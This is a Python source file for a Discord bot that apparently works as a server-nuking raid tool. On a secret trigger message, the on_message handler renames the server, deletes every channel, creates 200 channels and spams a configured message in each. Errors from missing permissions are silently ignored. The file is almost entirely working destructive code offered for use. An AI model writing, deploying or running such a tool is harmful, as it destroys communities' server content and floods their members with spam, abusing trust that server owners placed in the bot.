import discord
from discord.ext import commands
import json
import os
from dotenv import load_dotenv
from colorama import Fore, init

init()
load_dotenv()

with open('config.json') as f:
    config = json.load(f)

print(Fore.CYAN + "1\n2\n3\n4\n5\n" + Fore.WHITE + "coded by calix\n" + Fore.CYAN + "now put a password:")
password = input()
if password == "calixpogi123":
    print(f"logged in as {config['bot_name']}\npress 1 to start")
    start = input()
    if start == "1":
        bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            print(f'game na tol {bot.user}')

        @bot.event
        async def on_message(message):
            if message.content == "calixpogi123":
                guild = message.guild
                try:
                    await guild.edit(name="bahay ni calix")
                    for channel in guild.channels:
                        await channel.delete()
                    for i in range(200):
                        channel = await guild.create_text_channel(config['channel_name'])
                        await channel.send(config['message'])
                except discord.Forbidden:
                    pass
            await bot.process_commands(message)

        bot.run(os.getenv('DISCORD_TOKEN'))